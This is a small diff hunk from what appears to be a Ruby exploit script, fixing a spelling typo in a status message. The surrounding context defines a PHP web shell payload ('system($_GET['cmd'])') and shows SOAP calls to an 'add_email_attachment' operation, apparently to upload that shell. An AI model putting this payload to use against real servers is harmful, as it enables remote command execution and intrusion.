@@ -29,7 +29,7 @@ shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.p
 client = Savon::Client.new(wsdl: url)
 
 # List all avialable operations 
-puts "[*] List all avialable operations "
+puts "[*] List all available operations "
 puts client.operations
 
 puts "\n\n[*] Interact with :add_email_attachment operation"
